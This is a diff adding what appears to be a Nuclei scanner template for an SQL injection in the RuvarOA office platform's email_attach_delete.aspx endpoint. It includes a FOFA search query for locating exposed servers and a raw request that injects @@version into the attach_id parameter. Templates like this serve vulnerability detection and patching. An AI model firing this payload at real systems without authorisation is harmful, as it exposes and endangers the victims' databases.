@@ -1,0 +1,25 @@
+id: ruvaroa-email_attach_delete-sqli
+
+info:
+  name: "RuvarOA协同办公平台 email_attach_delete 接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+      RuvarOA协同办公平台的多个接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现数据库数据篡改、删除或新增操作，导致数据完整性受损。具体影响包括但不限于数据损坏、敏感信息泄露及业务逻辑异常。
+  tags: RuvarOA协同办公平台
+
+http:
+- raw:
+  - |
+    GET /LHMail/email_attach_delete.aspx?attach_id=@@version HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'nvarchar'
